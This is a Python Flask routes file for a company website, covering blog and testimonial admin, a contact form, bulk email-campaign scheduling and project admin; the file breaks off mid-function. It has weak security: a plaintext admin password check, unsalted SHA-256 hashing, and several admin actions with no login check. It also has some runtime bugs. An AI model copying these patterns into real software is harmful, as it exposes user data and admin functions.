from flask import Blueprint, render_template, redirect, url_for, request, current_app, session, jsonify, flash, send_file
from models import pages, blogs, query, testomony, db, Dataset, Template, Campaign, Contact, Unsubscriber, DatasetContact, CampaignRecipient, CampaignEmail
from services.email_service import EmailService
from werkzeug.utils import secure_filename
from datetime import datetime, timedelta, date
import uuid
import re
import os
import csv
from zoneinfo import ZoneInfo
from sqlalchemy import and_, or_
import requests
from docket.models import db, User, Project, ProjectFile, ProjectMessage, ProjectNotification, SharedFile
import hashlib
from functools import wraps
import time
import random


main_bp = Blueprint('main', __name__)



@main_bp.route('/')
def home():
    blog = blogs.query.order_by(blogs.date.desc()).limit(3).all()
    testimonies = testomony.query.order_by(testomony.date.desc()).limit(4).all()
    return render_template("/index.html",testimonies=testimonies,blog=blog)




# Add this function after your imports and before your routes
def format_file_size(size):
    """Format file size from bytes to human readable format"""
    if size is None or size == 0:
        return "0 B"
    
    units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
    i = 0
    size_float = float(size)
    while size_float >= 1024 and i < len(units) - 1:
        size_float /= 1024.0
        i += 1
    
    return f"{size_float:.2f} {units[i]}"

def allowed_file(filename):
    """Allow any file type - no restrictions"""
    return True  


@main_bp.route("/<string:slug>")
def webpages(slug):
    page = pages.query.filter_by(link=slug).first()
    if page:
        blog = blogs.query.order_by(blogs.date.desc()).limit(5).all()
        return render_template('ptemp.html', page=page, blog=blog)
    
    blog_entry = blogs.query.filter_by(link=slug).first()
    if blog_entry:
        return render_template('blogpage.html', blog=blog_entry)
    
    return redirect(url_for('main.page_not_found'))


@main_bp.route('/query', methods=['POST'])  # inside routes.py
def handle_query():
    if request.method == 'POST':
                # Verify simple math question (7 + 5 = ?)
        math_answer = request.form.get('math_verification', '').strip()
        
        try:
            math_answer = int(math_answer)
        except ValueError:
            flash("Please enter a valid number for the verification question.", "danger")
            return redirect(url_for('main.con'))
        
        # Check if answer is correct (7 + 5 = 12)
        if math_answer != 12:
            flash("Incorrect answer to the verification question. Please try again.", "danger")
            return redirect(url_for('main.con'))
        
        name = re.sub(r'[<>]', '', request.form.get('name', '').strip())
        email = re.sub(r'[<>]', '', request.form.get('email', '').strip())
        subject = re.sub(r'[<>]', '', request.form.get('subject', '').strip())
        message = re.sub(r'[<>]', '', request.form.get('message', '').strip())

        entry = query(name=name, email=email, subject=subject, message=message)
        db.session.add(entry)
        db.session.commit()

        query_data = {
            "name": entry.name,
            "email": entry.email,
            "subject": entry.subject,
            "message": entry.message,
            "srno": str(entry.srno)
        }

        # Send email
        email_service = EmailService()
        email_service.send_query_notification(query_data)

        return "Thankyou"
    
    else:
        stat = False
        return render_template('/Error-404',stat=stat)    
     



# Logic for admin login and logout 

@main_bp.route('/admin', methods=['GET', 'POST'])
def admin_login():
    # If already logged in as admin
    if session.get('admin_logged_in'):
        return redirect(url_for('main.admin_projects'), Admin_name=session['admin_Fname'])

    error = None

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Find admin in User table
        user = User.query.filter_by(email=username).first()  # or username=username

        if user and user.role.lower() == "admin" and user.password == password:
            # Store admin session
            session['admin_logged_in'] = True
            session['admin_id'] = user.id
            session['admin_email'] = user.email
            session['admin_name'] = f"{user.first_name} {user.last_name}"
            session['admin_Fname'] = user.first_name
            
            flash("Admin login successful!", "success")
            return redirect(url_for('main.admin_projects'))
        else:
            error = "Invalid admin credentials."

    return render_template('admin.html', error=error)


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            flash('You must be logged in as admin to access this page.', 'warning')
            return redirect(url_for('main.admin_login'))
        return f(*args, **kwargs)
    return decorated_function


@main_bp.route('/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('main.admin_login'))



# Route to editing Testomony via Admin panal

@main_bp.route("/Edit-Testomony")
def Edit_Testomony():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to view the dashboard.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))    


    testimonies = testomony.query.order_by(testomony.date.desc()).all()
    return render_template("/Camp/Edit_Testomony.html", testimonies=testimonies, Admin_name=session['admin_Fname'])



@main_bp.route("/Edit-Test/<int:testimony_id>")
def edit_test(testimony_id):
    testimonies = testomony.query.get_or_404(testimony_id)
    return render_template("Camp/Edit_Testomony_Form.html", testimonies=testimonies, Admin_name=session['admin_Fname'])


@main_bp.route("/Update-Testimony/<int:testimony_id>", methods=['POST'])
def update_testimony(testimony_id):
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    testimony = testomony.query.get_or_404(testimony_id)


    if request.method == "POST":
        action = request.form.get("action")

        if action == "update":
            testimony.name = request.form['name']
            testimony.designaiton = request.form['designaiton']
            testimony.content = request.form['content']
            testimony.stars = request.form['stars']

            image_file = request.files.get("image")

            # Image Upload
            if image_file and image_file.filename != "":
                if image_file.mimetype in ["image/png", "image/jpeg"]:
                    image_filename = secure_filename(image_file.filename)
                    image_path = os.path.join("static/img/testimonials", image_filename)
                    image_file.save(image_path)
                    testimony.image = image_path  # Save relative path

                else:
                    flash("Only PNG or JPEG images are allowed.", "danger")
                    return redirect(request.url)


            video_file = request.files.get("video")
            if video_file and video_file.filename != "":
                if video_file.mimetype == "video/mp4":
                    filename = secure_filename(video_file.filename)
                    video_path = os.path.join("static/videos", filename)
                    video_file.save(video_path)
                    testimony.video = video_path  # Save relative path
                    # You can save `video_path` to DB if needed
                else:
                    flash("Only MP4 videos are allowed.", "danger")
                    return redirect(request.url)
        
        
        
            db.session.commit()
            flash("Testimony updated successfully!", "success")
            return redirect(url_for("main.Edit_Testomony"))
        

        elif action == "delete":
            db.session.delete(testimony)
            db.session.commit()
            flash("Testimony deleted successfully!", "warning")
            return redirect(url_for("main.Edit_Testomony"))
        
    return render_template("Camp/Edit_Testomony_Form.html", testimonies=testimony, Admin_name=session['admin_Fname'])



# Adding New Testimony

@main_bp.route("/Add-Testimony", methods=["GET", "POST"])
def add_testimony():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    if request.method == "POST":
        name = request.form["name"]
        designaiton = request.form["designaiton"]
        content = request.form["content"]
        stars = int(request.form["stars"])
        date = datetime.now()

        image_file = request.files.get("image")

        # Image Upload
        if image_file and image_file.filename != "":
            if image_file.mimetype in ["image/png", "image/jpeg"]:
                image_filename = secure_filename(image_file.filename)
                image_path = os.path.join("static/img/testimonials", image_filename)
                image_file.save(image_path)
                image_url_path = os.path.join("static", "img", "blog", image_filename).replace("\\", "/")

            else:
                flash("Only PNG or JPEG images are allowed.", "danger")
                return redirect(request.url)


        video_file = request.files.get("video")
        if video_file and video_file.filename != "":
            if video_file.mimetype == "video/mp4":
                filename = secure_filename(video_file.filename)
                video_file = os.path.join("static/videos", filename)
                video_file.save(video_file)
                  # Save relative path
                
            else:
                flash("Only MP4 videos are allowed.", "danger")
                return redirect(request.url)

        new_testimony = testomony(
            name=name,
            designaiton=designaiton,
            content=content,
            stars=stars,
            image=image_url_path,
            video=video_file,
            date=date
        )
        db.session.add(new_testimony)
        db.session.commit()
        flash("New testimony added successfully", "success")
        return redirect(url_for("main.Edit_Testomony"))

    return render_template("Camp/Edit_Testomony_Form.html", Admin_name=session['admin_Fname'])



# Route to editing blog via Admin panal
@main_bp.route("/Edit-blogs")
def Editblogs():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to view the dashboard.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))    


    blog = blogs.query.order_by(blogs.date.desc()).limit(12).all()
    return render_template("Camp/Edit-blog.html", blog=blog, Admin_name=session['admin_Fname'])



@main_bp.route("/Edit-Blog/<int:srno>")
def Edit_Blog(srno):
    blog = blogs.query.get_or_404(srno)
    return render_template("Camp/Edit_blog_Form.html", blog=blog, Admin_name=session['admin_Fname'])






@main_bp.route("/Update-Blog/<int:srno>", methods=['POST'])
def update_blog(srno):
    blog = blogs.query.get_or_404(srno)


    if request.method == "POST":
        action = request.form.get("action")

        if action == "update":
            image_file = request.files.get("image")
            author_img = request.files.get("author_img")
            blog.author = request.form["author"]
            blog.category = request.form["category"]
            blog.date = request.form["date"]
            blog.title = request.form["title"]
            blog.content = request.form["content"]
            blog.link = request.form["link"]
            blog.meta = request.form["meta"]

            # Save featured image
            image_path = save_uploaded_file(image_file, upload_dir="static/img/blog", prefix="main")
            blog.image = image_path if image_path else blog.image
            if image_file and image_path is None:
                flash("Only PNG or JPEG images are allowed for main image.", "danger")
                return redirect(request.url)


            # Save author image
            author_path = save_uploaded_file(author_img, upload_dir="static/img/blog", prefix="author")
            blog.author_img = author_path if author_path else blog.author_img
            if author_img and author_path is None:
                flash("Only PNG or JPEG images are allowed for author image.", "danger")
                return redirect(request.url)
        

            db.session.commit()
            flash("Blog updated successfully!", "success")
            return redirect(url_for("main.Editblogs"))
        

        elif action == "delete":
            db.session.delete(blog)
            db.session.commit()
            flash("Blog deleted successfully!", "warning")
            return redirect(url_for("main.Editblogs"))

    # 🚨 Fallback return in case of invalid or missing action
    flash("Invalid action.", "danger")
    return redirect(url_for("main.Editblogs"))




def save_uploaded_file(file_obj, upload_dir="static/uploads", prefix=""):
    """
    Saves an uploaded file to a specified directory and returns the web path.

    Parameters:
        file_obj (FileStorage): The uploaded file from request.files.
        upload_dir (str): Folder to save the file (relative to project root).
        prefix (str): Optional prefix to add to filename (e.g., 'author_', 'main_').

    Returns:
        str: Web-accessible path (e.g., '/static/uploads/filename.jpg') or None if invalid.
    """
    if file_obj and file_obj.filename != "":
        if file_obj.mimetype in ["image/png", "image/jpeg"]:
            filename = secure_filename(file_obj.filename)
            unique_name = f"{uuid.uuid4().hex}_{filename}"

            # Ensure the folder exists
            os.makedirs(upload_dir, exist_ok=True)

            # Save the file
            save_path = os.path.join(upload_dir, unique_name)
            file_obj.save(save_path)

            # Convert to web path
            web_path = "/" + save_path.replace("\\", "/")
            return web_path

    return None



@main_bp.route("/Add-Blog", methods=["GET", "POST"])
def add_blog():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    if request.method == "POST":
        image_file = request.files.get("bgimage")
        print("Image File:", image_file)
        author_img = request.files.get("author_img")
        author = request.form["author"]
        category = request.form["category"]
        date = request.form["date"]
        title = request.form["title"]
        content = request.form["content"]
        link = request.form["link"]
        meta = request.form["meta"]

        
        # Save featured image
        image_path = save_uploaded_file(image_file, upload_dir="static/img/blog")
        print(image_path)
        if image_file and image_path is None:
            flash("Only PNG or JPEG images are allowed for main image.", "danger")
            return redirect(request.url)

        # Save author image
        author_path = save_uploaded_file(author_img, upload_dir="static/img/blog")
        if author_img and author_path is None:
            flash("Only PNG or JPEG images are allowed for author image.", "danger")
            return redirect(request.url)

        new_blog = blogs(
            image=image_path,
            author_img=author_path,
            author=author,
            category=category,
            date=date,
            title=title,
            content=content,
            meta=meta,
            link=link
        )

        db.session.add(new_blog)
        db.session.commit()
        flash("New Blog added successfully", "success")
        return redirect(url_for("main.Editblogs"))

    return render_template("Camp/Edit_blog_Form.html", Admin_name=session['admin_Fname'])

# Other pages logics 


@main_bp.route("/Article-and-Blogs")
def blog_list():
    page = request.args.get('page', 1, type=int)
    per_page = 6  # Posts per page

    pagination = blogs.query.order_by(blogs.date.desc()).paginate(page=page, per_page=per_page)
    posts = pagination.items

    return render_template("blog.html", posts=posts, pagination=pagination)







def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

@main_bp.route('/Add-User', methods=['GET', 'POST'])
def add_user():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        first_name = request.form.get('first_name')
        last_name = request.form.get('last_name')
        phone = request.form.get('phone')
        
        # Validation
        if not all([email, password, first_name, last_name]):
            flash('All fields are required', 'error')
            return render_template('Camp/add-user.html')
        
        if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
            flash('Invalid email format', 'error')
            return render_template('Camp/add-user.html')
        
        if len(password) < 8:
            flash('Password must be at least 8 characters long', 'error')
            return render_template('Camp/add-user.html')
        
        
        # Create user
        hashed_password = hash_password(password)
        
        user = User(
            email=email,
            password=hashed_password,
            first_name=first_name,
            last_name=last_name,
            phone=phone
        )
        
        db.session.add(user)
        db.session.commit()
        
        flash('User created successfully!', 'success')
        return redirect(url_for('main.add_user'))
    
    return render_template('Camp/add-user.html', Admin_name=session['admin_Fname'])





# logics for Campaigns-Automation form




# Helper functions
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in {'csv'}

def count_csv_records(filepath):
    with open(filepath, 'r', encoding='utf-8') as f:
        reader = csv.reader(f)
        return sum(1 for row in reader) - 1  # exclude header

# Routes
@main_bp.route('/Campaigns-Automation')
def campaign_automation():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    datasets = Dataset.query.all()
    templates = Template.query.all()
    campaigns = Campaign.query.filter_by(is_deleted=False).all()
    campaigns_data = [c.to_dict() for c in campaigns]

    # Stats for dashboard
    active_campaigns = Campaign.query.filter_by(status='active').count()
    Unsubscribers = Unsubscriber.query.count()
    total_recipients = sum(d.record_count for d in datasets)
    avg_open_rate = 88.5  # This would come from your analytics
    


    sender_emails = ['Andrew@engineer-ip.com', 'Mike@engineer-ip.com', 'mail@engineer-ip.com']
    
    return render_template('/Camp/camp-auto.html',
                           datasets=datasets,
                           templates=templates,
                           campaigns=campaigns_data,
                           active_campaigns=active_campaigns,
                           Unsubscribers=Unsubscribers,
                           total_recipients=total_recipients,
                           avg_open_rate=avg_open_rate,
                           sender_emails=sender_emails, Admin_name=session['admin_Fname'])

@main_bp.route('/upload_dataset', methods=['POST'])
def upload_dataset():
    if 'csv_file' not in request.files:
        return redirect(request.url)
    
    file = request.files['csv_file']
    dataset_name = request.form['dataset_name']
    filename = secure_filename(file.filename)

    if file.filename == '':
        return redirect(request.url)
    
    if file and allowed_file(file.filename):
        # Process CSV
        csv_data = file.read().decode('utf-8').splitlines()
        reader = csv.DictReader(csv_data)
        
        new_dataset = Dataset(
            name=dataset_name,
            filename=filename,
            record_count=0
        )
        db.session.add(new_dataset)
        db.session.commit()
        
        record_count = 0
        for row in reader:
            email = row.get('email', '').strip().lower()
            if not email:
                continue
                
            # Find or create contact
            contact = Contact.query.filter_by(email=email).first()
            if not contact:
                contact = Contact(
                    email=email,
                    first_name=row.get('first_name', ''),
                    last_name=row.get('last_name', ''),
                    custom_id=row.get('custom_id', '')
                )
                db.session.add(contact)
                db.session.commit()
            
            # Link contact to dataset
            if not DatasetContact.query.filter_by(
                dataset_id=new_dataset.id,
                contact_id=contact.id
            ).first():
                dataset_contact = DatasetContact(
                    dataset_id=new_dataset.id,
                    contact_id=contact.id
                )
                db.session.add(dataset_contact)
                record_count += 1
        
        new_dataset.record_count = record_count
        db.session.commit()
        
        flash(f'Dataset uploaded with {record_count} contacts', 'success')
    
    return redirect(url_for('main.campaign_automation'))
    

@main_bp.route('/delete_dataset', methods=['POST'])
def delete_dataset():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    dataset_id = request.form.get('dataset_id')
    if not dataset_id:
        flash('Missing dataset ID', 'danger')
        return redirect(url_for('main.campaign_automation'))
    
    dataset = Dataset.query.get(dataset_id)

        # Check if any campaigns are using this dataset
    campaigns_using_dataset = Campaign.query.filter_by(dataset_id=dataset_id).first()
    if campaigns_using_dataset:
        flash('Cannot delete dataset because it is used in one or more campaigns', 'danger')
        # Fixed redirect to use blueprint name
        return redirect(url_for('main.campaign_automation'))

    DatasetContact.query.filter_by(dataset_id=dataset_id).delete()
    if dataset:
        try:
            # Delete associated file
            filepath = os.path.join(current_app.config['UPLOAD_FOLDER'], dataset.filename)
            if os.path.exists(filepath):
                os.remove(filepath)
            
            # Delete from database
            db.session.delete(dataset)

            db.session.commit()
            flash(f'Dataset "{dataset.name}" deleted successfully', 'success')
        except Exception as e:
            flash(f'Error deleting dataset: {str(e)}', 'danger')
    else:
        flash('Dataset not found', 'danger')
    
    return redirect(url_for('main.campaign_automation'))



@main_bp.route('/view_dataset/<int:dataset_id>')
def view_dataset(dataset_id):
    dataset = Dataset.query.get(dataset_id)
    if not dataset:
        flash('Dataset not found', 'danger')
        return redirect(url_for('main.campaign_automation'))
    
    contacts = DatasetContact.query.filter_by(dataset_id=dataset_id).all()
    contact_list = []
    for dc in contacts:
        contact = Contact.query.get(dc.contact_id)
        if contact:
            contact_list.append({
                'id': contact.id,
                'email': contact.email,
                'first_name': contact.first_name,
                'last_name': contact.last_name,
                'custom_id': contact.custom_id
            })
    
    return render_template('/Camp/view_dataset.html', dataset=dataset, contacts=contact_list)






@main_bp.route('/save_template', methods=['POST'])
def save_template():
    template_name = request.form['template_name']
    template_subject = request.form['template_subject']
    template_content = request.form['template_content']
    
    new_template = Template(
        name=template_name,
        subject=template_subject,
        content=template_content
    )
    
    db.session.add(new_template)
    db.session.commit()
    
    return jsonify({
        'success': True,
        'template_id': new_template.id,
        'template_name': new_template.name,
        'content': new_template.content
    })

@main_bp.route('/get_template/<int:template_id>')
def get_template(template_id):
    template = Template.query.get(template_id)
    if template:
        return jsonify({
            'id': template.id,
            'name': template.name,
            'subject': template.subject,
            'content': template.content
        })
    return jsonify({'error': 'Template not found'}), 404




@main_bp.route('/create_campaign', methods=['POST'])
def create_campaign():
    try:
        # Extract form data
        name = request.form['campaign_name']
        dataset_id = request.form['recipient_dataset']
        sender_email = request.form['sender_email']
        start_datetime = datetime.strptime(request.form['start_datetime'], '%Y-%m-%dT%H:%M')
        
        # Extract email sequences (initial + follow-ups)
        email_subjects = request.form.getlist('email_subject[]')
        email_templates = request.form.getlist('email_template[]')
        followup_delays = request.form.getlist('followup_delay[]')
        
        # Validate sequences
        if not email_templates:
            flash("At least one email template is required", "danger")
            return redirect(url_for('main.campaign_automation'))
        
        # Create campaign
        campaign = Campaign(
            name=name,
            sender_email=sender_email,
            dataset_id=dataset_id,
            start_date=start_datetime,
            next_run=start_datetime,
            status='active',
            completion=0
        )
        db.session.add(campaign)
        db.session.flush()  # Get campaign ID
        
        # Create initial email (delay=0)
        initial_template = Template.query.get(email_templates[0])
        if not initial_template:
            flash("Invalid template selected", "danger")
            return redirect(url_for('main.campaign_automation'))
            
        initial_email = CampaignEmail(
            campaign_id=campaign.id,
            template_id=initial_template.id,
            subject=email_subjects[0] if email_subjects else initial_template.subject,
            delay_days=0,
            sequence_order=1
        )
        db.session.add(initial_email)
        
        # Create follow-up emails
        for i, delay in enumerate(followup_delays):
            # Sequence index starts after initial email
            sequence_index = i + 2
            
            # Get template (follow-up templates start from index 1)
            if (i + 1) >= len(email_templates):
                flash("Missing template for follow-up email", "danger")
                return redirect(url_for('main.campaign_automation'))
                
            template = Template.query.get(email_templates[i+1])
            if not template:
                flash(f"Invalid template for follow-up {sequence_index}", "danger")
                return redirect(url_for('main.campaign_automation'))
            
            # Use custom subject if available
            subject = template.subject
            if (i + 1) < len(email_subjects) and email_subjects[i+1].strip():
                subject = email_subjects[i+1]
                
            followup_email = CampaignEmail(
                campaign_id=campaign.id,
                template_id=template.id,
                subject=subject,
                delay_days=int(delay),
                sequence_order=sequence_index
            )
            db.session.add(followup_email)
        
        db.session.commit()
        return jsonify(success=True, message=f"Campaign '{campaign.name}' created successfully!")
    
    except Exception as e:
        db.session.rollback()
        current_app.logger.error(f"Error creating campaign: {str(e)}", exc_info=True)
        flash(f"Error creating campaign: {str(e)}", "danger")
        return jsonify(success=False, message=f"Server Error: {str(e)}"), 500






def send_scheduled_campaigns():
    print("Running scheduled campaigns...")
    try:
        formatted = datetime.now(ZoneInfo("Asia/Kolkata"))
        now = formatted.strftime("%Y-%m-%d %H:%M:%S")
        campaigns = Campaign.query.filter(
            Campaign.status == 'active',
            Campaign.next_run <= now
        ).all()
        print(f"Found {len(campaigns)} active campaigns to process at {now}")
        
        for campaign in campaigns:
            try:
                # Get the campaign emails ordered by sequence
                emails = CampaignEmail.query.filter_by(
                    campaign_id=campaign.id
                ).order_by(CampaignEmail.sequence_order).all()
                
                if not emails:
                    campaign.status = 'completed'
                    db.session.commit()
                    continue
                    
                # Find the current email to send
                current_email = None
                next_email = None
                email_index = 0
                
                for i, email in enumerate(emails):
                    # Calculate send time for this email
                    start_date = campaign.start_date
                    send_time = (start_date + timedelta(days=email.delay_days)).strftime("%Y-%m-%d %H:%M:%S")
                    
                    # Check if this email should be sent now
                    if send_time <= now:
                        # Check if this email has already been sent to all recipients
                        sent_count = CampaignRecipient.query.filter_by(
                            campaign_id=campaign.id,
                            email_index=i,
                            sent=True
                        ).count()
                        
                        # Also check for unsubscribed contacts who shouldn't be counted
                        unsubscribed_count = CampaignRecipient.query.filter_by(
                            campaign_id=campaign.id,
                            email_index=i,
                            unsubscribed=True
                        ).count()
                        
                        total_recipients = DatasetContact.query.filter_by(
                            dataset_id=campaign.dataset_id
                        ).count()
                        
                        # Effective total excludes unsubscribed contacts
                        effective_total = total_recipients - unsubscribed_count
                        
                        if sent_count < effective_total:
                            current_email = email
                            email_index = i
                            
                            # Find the next email in sequence
                            if i + 1 < len(emails):
                                next_email = emails[i + 1]
                            break
                
                if not current_email:
                    campaign.status = 'completed'
                    db.session.commit()
                    continue
                    
                # Get dataset contacts who haven't received this email yet
                contacts = Contact.query.join(DatasetContact).filter(
                    DatasetContact.dataset_id == campaign.dataset_id
                ).outerjoin(
                    CampaignRecipient,
                    and_(
                        CampaignRecipient.contact_id == Contact.id,
                        CampaignRecipient.campaign_id == campaign.id,
                        CampaignRecipient.email_index == email_index
                    )
                ).filter(
                    # Include contacts without any record OR with sent=False and not unsubscribed
                    or_(
                        CampaignRecipient.id.is_(None),
                        and_(
                            CampaignRecipient.sent == False,
                            CampaignRecipient.unsubscribed == False
                        )
                    )
                ).all()
                
                sent_count = 0
                skipped_unsubscribed = 0
                errors = 0
                
                for contact in contacts:
                    # Check if contact is unsubscribed (global or campaign-specific)
                    is_unsubscribed_global = Unsubscriber.query.filter(
                        Unsubscriber.contact_id == contact.id,
                        Unsubscriber.campaign_id.is_(None)
                    ).first()
                    
                    is_unsubscribed_campaign = CampaignRecipient.query.filter(
                        CampaignRecipient.contact_id == contact.id,
                        CampaignRecipient.campaign_id == campaign.id,
                        CampaignRecipient.unsubscribed == True
                    ).first()
                    
                    if is_unsubscribed_global or is_unsubscribed_campaign:
                        # Check if we already have a record for this email
                        existing_record = CampaignRecipient.query.filter_by(
                            campaign_id=campaign.id,
                            contact_id=contact.id,
                            email_index=email_index
                        ).first()
                        
                        if existing_record:
                            existing_record.unsubscribed = True
                        else:
                            recipient = CampaignRecipient(
                                campaign_id=campaign.id,
                                contact_id=contact.id,
                                email_index=email_index,
                                sent=False,
                                unsubscribed=True,
                                created_at=now
                            )
                            db.session.add(recipient)
                        
                        skipped_unsubscribed += 1
                        db.session.commit()  # COMMIT UNSUBSCRIBE STATUS IMMEDIATELY
                        continue
                        
                    # Create unsubscribe link with tracking
                    unsubscribe_url = f"https://yourdomain.com/unsubscribe?campaign_id={campaign.id}&contact_id={contact.id}&email_index={email_index}"

                    # Prepare email content
                    email_content = current_email.template.content \
                        .replace('{{unsubscribe_link}}', unsubscribe_url) \
                        .replace('{{first_name}}', contact.first_name or '') \
                        .replace('{{last_name}}', contact.last_name or '') \
                        .replace('{{email}}', contact.email or '') \
                        .replace('{{custom_id}}', contact.custom_id or '')
                        
                    # Prepare subject line
                    email_subject = current_email.subject \
                        .replace('{{first_name}}', contact.first_name or '') \
                        .replace('{{last_name}}', contact.last_name or '') \
                        .replace('{{email}}', contact.email or '') \
                        .replace('{{custom_id}}', contact.custom_id or '')
                    
                    # Send email
                    try:
                        success = send_email(
                            recipient_id=contact.id,
                            to_email=contact.email,
                            first_name=contact.first_name,
                            last_name=contact.last_name,
                            custom_id=contact.custom_id,
                            html_template=email_content,
                            from_email=campaign.sender_email,
                            subject=email_subject
                        )
                        
                        if success:
                            # Check if record already exists (from previous failed attempt)
                            existing_record = CampaignRecipient.query.filter_by(
                                campaign_id=campaign.id,
                                contact_id=contact.id,
                                email_index=email_index
                            ).first()
                            
                            if existing_record:
                                existing_record.sent = True
                                existing_record.sent_at = now
                            else:
                                recipient = CampaignRecipient(
                                    campaign_id=campaign.id,
                                    contact_id=contact.id,
                                    email_index=email_index,
                                    sent=True,
                                    sent_at=now,
                                    created_at=now
                                )
                                db.session.add(recipient)
                            
                            sent_count += 1
                            db.session.commit()  # CRITICAL: COMMIT AFTER EACH SUCCESSFUL SEND
                            
                            
                        else:
                            errors += 1
                            
                    except Exception as e:
                        current_app.logger.error(f"Error sending email to {contact.email}: {str(e)}")
                        errors += 1
                        db.session.rollback()  # Rollback if there's an error during sending
                    
                    delay = random.uniform(3, 5)  # Random delay between 3 to 5 seconds
                    time.sleep(delay)
                
                # Schedule next run or complete campaign
                if next_email:
                    next_delay = next_email.delay_days - current_email.delay_days
                    campaign.next_run = (formatted + timedelta(days=next_delay)).strftime("%Y-%m-%d %H:%M:%S")
                    
                else:
                    campaign.status = 'completed'
                    campaign.next_run = None
                
                # Update completion percentage
                total_emails = len(emails)
                campaign.completion = int((email_index + 1) / total_emails * 100)
                
                db.session.commit()
                
                # Log results
                current_app.logger.info(
                    f"Sent campaign {campaign.id} email {email_index+1} to {sent_count} contacts. "
                    f"Skipped {skipped_unsubscribed} unsubscribed. Errors: {errors}"
                )
                
                
                entry = query(name=f"Campaign Completed : {campaign.name}", email= f"Template Sent {current_email.template.name}", subject= f"Sent campaign {campaign.id} email {email_index+1} to {sent_count} contacts. ", message="", srno = f"Campaign Completed : {campaign.name}")

        
                query_data = {
                    "name": entry.name,
                    "email": entry.email,
                    "subject": entry.subject,
                    "message": entry.message,
                    "srno": entry.srno
                }
        
                # Send email
                email_service = EmailService()
                email_service.send_query_notification(query_data)                
                
            except Exception as e:
                current_app.logger.error(f"Error processing campaign {campaign.id}: {str(e)}")
                db.session.rollback()
                continue

    except Exception as e:
        current_app.logger.error(f"Campaign scheduler error: {str(e)}")
        db.session.rollback()
        raise
    
    

def send_email(recipient_id, to_email, first_name, last_name, custom_id, html_template, from_email, subject):
    api_key = current_app.config['API_KEY']
    base_url = current_app.config['BASE_URL']
    
    # if from_email == 'mike@engineerip.com':
    #     Sender_name = f"Mike <{from_email}>"

    payload = {
        "apikey": api_key,
        "subject": subject,
        "from": from_email,
        "to": to_email,
        "bodyHtml": html_template,
        "isTransactional": True
    }
    
    try:
        response = requests.post(base_url, data=payload, timeout=10)
        if response.status_code == 200:
            current_app.logger.info(f"Email sent to {to_email}")
            return True
        else:
            current_app.logger.error(f"Email failed to {to_email}: {response.text}")
            return False
    except Exception as e:
        current_app.logger.error(f"Email error for {to_email}: {str(e)}")
        return False




@main_bp.route('/resume_campaign', methods=['POST'])
def resume_campaign():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))
    
    try:
        action = request.form.get('action')
        campaign_id = request.form['campaign_id']
        campaign = Campaign.query.get(campaign_id)

        if action == 'pause_campaign':
            campaign.status = 'paused'
            db.session.commit()
            flash('Campaign Paused successfully', 'success')


        if action == 'resume_campaign':
            campaign.status = 'active'
            db.session.commit()
            flash('Campaign resumed successfully', 'success')

        else:
            flash('Campaign not found', 'error')


    except Exception as e:
        db.session.rollback()
        current_app.logger.error(f"Error resuming campaign: {str(e)}")
        flash('Error resuming campaign', 'error')
    
    return redirect(url_for('main.campaign_automation'))





@main_bp.route('/delete_campaign', methods=['POST'])
def delete_campaign():
    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    if not session.get('admin_logged_in'):
        flash('You must be logged in as admin to perform this action.', 'warning')
        return redirect(url_for('main.admin_login', error="To view this page you need to be logged in as admin"))

    try:
        campaign_id = request.form['campaign_id']
        campaign = Campaign.query.get(campaign_id)

        if campaign:
            campaign.is_deleted = True
            campaign.status = 'completed'
            db.session.commit()
            flash('Campaign archived successfully', 'success')
        else:
            flash('Campaign not found', 'error')

    except Exception as e:
        db.session.rollback()
        current_app.logger.error(f"Error archiving campaign: {str(e)}")
        flash('Error archiving campaign', 'error')

    return redirect(url_for('main.campaign_automation'))




































# Admin routes for project management



@main_bp.route('/admin/projects')
@admin_required
def admin_projects():
    return render_template('Camp/admin-projects.html', Admin_name=session['admin_Fname'], today=date.today())

@main_bp.route('/admin/get-all-projects')
@admin_required
def get_all_projects():
    # Get all projects with user info
    projects = Project.query.join(User).order_by(Project.created_at.desc()).all()
    
    projects_data = []
    for project in projects:
        # Get file count
        file_count = ProjectFile.query.filter_by(project_id=project.id).count()
        
        # Get last message
        last_message = ProjectMessage.query.filter_by(project_id=project.id)\
            .order_by(ProjectMessage.created_at.desc())\
            .first()
        
        # Check for new messages (messages from client not seen by admin)
        new_messages_count = ProjectMessage.query.filter_by(
            project_id=project.id,
            is_admin=False,  # Client messages
            is_seen=False    # Not seen by admin
        ).count()
        
        projects_data.append({
            'id': project.id,
            'name': project.name,
            'ref_id': project.ref_id,
            'description': project.description,
            'due_date': project.due_date.isoformat(),
